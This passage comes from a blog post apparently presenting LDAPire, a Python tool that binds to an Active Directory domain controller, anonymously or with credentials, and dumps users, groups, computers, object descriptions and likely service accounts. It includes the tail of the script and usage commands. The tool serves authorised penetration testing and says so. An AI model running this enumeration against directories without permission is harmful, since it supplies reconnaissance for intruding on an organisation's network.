print(\u0026#34; Connection Attempts\u0026#34;) print(\u0026#34;------------------------------------------------------------\u0026#34;) # Attempt to connect with SSL first, then without SSL for use_ssl in [True, False]: protocol = \u0026#34;SSL\u0026#34; if use_ssl else \u0026#34;non-SSL\u0026#34; print(f\u0026#34; • Attempting {protocol} connection...\u0026#34;) logging.info(f\u0026#34;Attempting to connect to {args.dc_ip} with {protocol}\u0026#34;) s, c, checkserver = attempt_connection(args.dc_ip, use_ssl, user, password) if checkserver: print(f\u0026#34; ✓ Connected successfully using {\u0026#39;authenticated\u0026#39; if user else \u0026#39;anonymous\u0026#39;} bind\u0026#34;) logging.info(f\u0026#34;Connected successfully using {\u0026#39;authenticated\u0026#39; if user else \u0026#39;anonymous\u0026#39;} bind\u0026#34;) # Get base_dn from server info base_dn = s.info.other[\u0026#39;defaultNamingContext\u0026#39;][0] # Show anonymous bind warning if using anonymous bind if not user: print(\u0026#34;\\n------------------------------------------------------------\u0026#34;) print(\u0026#34; Security Warning\u0026#34;) print(\u0026#34;------------------------------------------------------------\u0026#34;) print(\u0026#34; ⚠️ WARNING: Connected using Anonymous Bind\u0026#34;) print(\u0026#34; ⚠️ This is a security risk and should be disabled\\n\u0026#34;) # We have confirmed access, proceed with enumeration process_ldap_results(c, base_dn, args.dc_ip) return # Exit after successful enumeration elif c: # We got a connection but no read access print(\u0026#34; ⚠️ Connection established but no read access\u0026#34;) logging.warning(\u0026#34;Connected but no read access\u0026#34;) else: print(f\u0026#34; ✗ Failed to connect with {protocol}\u0026#34;) logging.warning(f\u0026#34;Failed to connect with {protocol}\u0026#34;) print() # Add spacing before final message # If we get here, all connection attempts failed print(\u0026#34;------------------------------------------------------------\u0026#34;) print(\u0026#34; Connection Failed\u0026#34;) print(\u0026#34;------------------------------------------------------------\u0026#34;) print(\u0026#34; ⚠️ Could not establish LDAP connection\u0026#34;) print(\u0026#34; • Anonymous bind may be disabled (good security practice)\u0026#34;) print(\u0026#34; • Credentials may be incorrect\u0026#34;) print(\u0026#34; • Server may be unreachable\u0026#34;) print(\u0026#34; • LDAP/LDAPS ports may be filtered\\n\u0026#34;) logging.error(\u0026#34;All connection attempts failed\u0026#34;) sys.exit(1) if __name__ == \u0026#34;__main__\u0026#34;: main() How to Use It Using the tool is straightforward. After installation, you can run it with the following syntax:\npython3 ldapire.py [DC_IP] [-u USERNAME] [-p PASSWORD] For example:\n# Authenticated enumeration python3 ldapire.py 192.168.1.1 -u \u0026#34;DOMAIN\\\\username\u0026#34; -p \u0026#34;password\u0026#34; # Anonymous enumeration python3 ldapire.py 192.168.1.1 The tool provides clear console output showing progress:\n============================================================ LDAP Information Retrieval Domain Enumeration ============================================================ Processing Users... Processing Groups... Processing Computers... Processing All Objects... Processing Descriptions... Searching for Service Accounts... Output and Analysis The tool generates several output files for different aspects of enumeration:\nBasic Information Files:\nUsers.txt: Simple list of user SAM account names Groups.txt: List of group SAM account names Computers.txt: List of computer SAM account names Objects.txt: List of all object SAM account names Detailed Information Files:\nUsersDetailed.txt: Comprehensive user attributes GroupsDetailed.txt: Comprehensive group attributes ComputersDetailed.txt: Comprehensive computer attributes ObjectsDetailedLdap.txt: All domain object details Special Reports:\nAllObjectDescriptions.txt: Consolidated descriptions from all objects ServiceAccounts.txt: Identified potential service accounts with context The detailed files include proper formatting of binary attributes such as: Security Identifiers (SIDs) GUIDs Exchange-specific attributes Other binary data types Ethical Considerations As with any tool, it\u0026rsquo;s crucial to use LDAPire responsibly and ethically. Always ensure you have explicit permission to test and enumerate the target Active Directory environment.\nHappy hunting!\nBloodstiller\nP.S. Remember, you can find the full source code and contribute to the project on the GitHub repository ",
